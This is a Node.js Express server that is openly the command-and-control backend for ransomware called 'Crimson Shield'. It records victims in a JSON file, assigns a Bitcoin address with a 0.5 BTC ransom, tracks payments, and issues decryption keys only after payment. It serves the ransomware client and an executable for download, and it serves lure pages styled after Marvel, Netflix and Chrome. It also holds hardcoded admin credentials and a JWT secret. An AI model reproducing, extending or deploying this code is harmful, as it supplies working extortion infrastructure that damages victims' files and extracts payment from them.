const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const { createServer } = require('http');
const { Server } = require('socket.io');

const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const PORT = process.env.PORT || 3001;

// ===== MIDDLEWARE =====
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ===== DEBUG: Log all requests =====
app.use((req, res, next) => {
    console.log(`📝 ${req.method} ${req.url}`);
    console.log('📦 Body:', req.body);
    next();
});

// ===== DATABASE =====
const VICTIMS_FILE = path.join(__dirname, 'database', 'victims.json');
if (!fs.existsSync(path.join(__dirname, 'database'))) {
    fs.mkdirSync(path.join(__dirname, 'database'));
}

let victims = [];
if (fs.existsSync(VICTIMS_FILE)) {
    try {
        victims = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
    } catch (e) {
        victims = [];
    }
}

function saveVictims() {
    fs.writeFileSync(VICTIMS_FILE, JSON.stringify(victims, null, 2));
}

// ===== 🔴 SIMPLIFIED LOGIN - NO ENV =====
app.post('/api/admin/login', (req, res) => {
    console.log('🔐 ===== LOGIN ATTEMPT =====');
    console.log('📦 Request body:', req.body);
    console.log('📦 Username:', req.body?.username);
    console.log('📦 Password:', req.body?.password);
    
    // HARDCODED CREDENTIALS
    const validUsername = 'admin';
    const validPassword = 'crimsonadmin';
    
    const { username, password } = req.body || {};
    
    if (username === validUsername && password === validPassword) {
        console.log('✅ LOGIN SUCCESS!');
        const token = jwt.sign(
            { admin: true, username: username },
            'fallback_secret_key_12345',
            { expiresIn: '24h' }
        );
        return res.json({ 
            success: true, 
            token: token 
        });
    } else {
        console.log('❌ LOGIN FAILED!');
        console.log(`Expected: ${validUsername}/${validPassword}`);
        console.log(`Received: ${username}/${password}`);
        return res.status(401).json({ 
            error: 'Invalid credentials',
            expected: validUsername,
            received: username
        });
    }
});

// ===== ADMIN ROUTES =====
app.get('/api/admin/dashboard', (req, res) => {
    const token = req.headers['authorization'];
    if (!token) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    try {
        jwt.verify(token.replace('Bearer ', ''), 'fallback_secret_key_12345');
    } catch (e) {
        return res.status(401).json({ error: 'Invalid token' });
    }
    
    const totalVictims = victims.length;
    const paidVictims = victims.filter(v => v.paid).length;
    const totalBTC = victims.reduce((sum, v) => sum + (v.paid ? 0.5 : 0), 0);
    
    res.json({
        totalVictims,
        paidVictims,
        totalBTC,
        recentVictims: victims.slice(-5).reverse(),
        activeVictims: victims.filter(v => !v.paid && !v.decrypted).length
    });
});

app.get('/api/admin/victims', (req, res) => {
    const token = req.headers['authorization'];
    if (!token) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    try {
        jwt.verify(token.replace('Bearer ', ''), 'fallback_secret_key_12345');
    } catch (e) {
        return res.status(401).json({ error: 'Invalid token' });
    }
    res.json(victims);
});

app.get('/api/admin/victim/:id', (req, res) => {
    const victim = victims.find(v => v.id === req.params.id);
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }
    res.json(victim);
});

app.post('/api/admin/check-payment', async (req, res) => {
    const { victimId } = req.body;
    const victim = victims.find(v => v.id === victimId);
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }
    res.json({ paid: victim.paid || false, victimId: victim.id });
});

app.post('/api/admin/generate-key', (req, res) => {
    const { victimId } = req.body;
    const victim = victims.find(v => v.id === victimId);
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }
    if (!victim.paid) {
        return res.status(400).json({ error: 'Victim has not paid' });
    }
    const decryptionKey = crypto.randomBytes(32).toString('hex');
    victim.decryptionKey = decryptionKey;
    victim.decrypted = true;
    saveVictims();
    res.json({ success: true, victimId: victim.id, decryptionKey });
});

// ===== CLIENT ROUTES =====
app.get('/download/ransomware.js', (req, res) => {
    const clientPath = path.join(__dirname, 'client', 'ransomware.js');
    if (fs.existsSync(clientPath)) {
        res.download(clientPath, 'crimson.js');
    } else {
        res.status(404).send('Client not found');
    }
});

app.get('/download/CrimsonShield.exe', (req, res) => {
    const exePath = path.join(__dirname, 'builder', 'CrimsonShield.exe');
    if (fs.existsSync(exePath)) {
        res.download(exePath, 'CrimsonShield.exe');
    } else {
        res.status(404).send('EXE not found');
    }
});

app.post('/api/register-victim', (req, res) => {
    const { systemInfo, filesEncrypted } = req.body;
    const victim = {
        id: crypto.randomBytes(8).toString('hex'),
        btcAddress: 'bc1qnjkxvj7avmet54w9rmzf0ldftwzh2fcwsdxuw7',
        systemInfo: systemInfo || {},
        filesEncrypted: filesEncrypted || 0,
        registeredAt: new Date().toISOString(),
        paid: false,
        paidAt: null,
        decrypted: false,
        decryptionKey: null
    };
    victims.push(victim);
    saveVictims();
    io.emit('new_victim', victim);
    res.json({ success: true, victimId: victim.id, btcAddress: victim.btcAddress, ransomAmount: 0.5 });
});

app.get('/api/health', (req, res) => {
    res.json({
        status: '💀 Crimson Shield Active',
        totalVictims: victims.length,
        timestamp: new Date().toISOString()
    });
});

app.get('/api/test', (req, res) => {
    res.json({
        message: 'Server is running!',
        port: PORT,
        victimsCount: victims.length
    });
});

// ===== SERVE PAGES =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'marvel.html'));
});

app.get('/marvel', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'marvel.html'));
});

app.get('/netflix', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'netflix.html'));
});

app.get('/chrome', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'chrome.html'));
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// ===== WEBSOCKET =====
io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);
    socket.emit('connected', { message: 'Connected to Crimson Shield Server' });
    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
    });
});

// ===== START SERVER =====
server.listen(PORT, '0.0.0.0', () => {
    console.log('╔═══════════════════════════════════════════╗');
    console.log('║     🔴 CRIMSON SHIELD RANSOMWARE 🔴       ║');
    console.log('╠═══════════════════════════════════════════╣');
    console.log(`║  Server:    http://localhost:${PORT}       ║`);
    console.log(`║  Dashboard: http://localhost:${PORT}/dashboard ║`);
    console.log(`║  Victims:   ${String(victims.length).padEnd(20)}    ║`);
    console.log('╚═══════════════════════════════════════════╝');
    console.log('💀 Ready to infect!');
});
